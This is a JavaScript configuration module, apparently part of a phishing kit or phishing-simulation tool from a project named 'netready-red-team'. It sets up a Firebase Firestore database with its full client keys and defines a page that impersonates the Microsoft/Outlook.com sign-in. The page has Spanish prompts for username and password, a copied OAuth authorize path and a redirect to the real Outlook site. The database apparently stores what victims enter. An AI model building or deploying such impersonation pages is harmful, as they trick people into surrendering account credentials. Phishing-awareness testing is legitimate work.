// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCVkOZDwhZO_NfKEdW-eqmPnj47ed1Niv8",
  authDomain: "netready-red-team.firebaseapp.com",
  projectId: "netready-red-team",
  storageBucket: "netready-red-team.appspot.com",
  messagingSenderId: "880253036837",
  appId: "1:880253036837:web:22d3651fc8427a4d1a92cc",
  measurementId: "G-5PJ0LDCCP5"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
export const db = getFirestore();

export default {
  title: "Iniciar sesión en la cuenta",
  description:
    "Para iniciar sesión en Outlook.com o Hotmail, necesitarás el nombre de usuario y la contraseña de tu cuenta de Microsoft.",
  url: {
    base: "/common/oauth2/v2.0/authorize",
    searchParams:
      "?client_id={uuid}&redirect_uri={encodeURIComponent}&response_type=code%20id_token&scope=openid%20profile%20offline_access&response_mode=form_post&nonce=638346296388632495.{token}&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0",
    redirect: "https://outlook.office.com/mail/",
    id: "client_id",
  },
  app,
  db
};
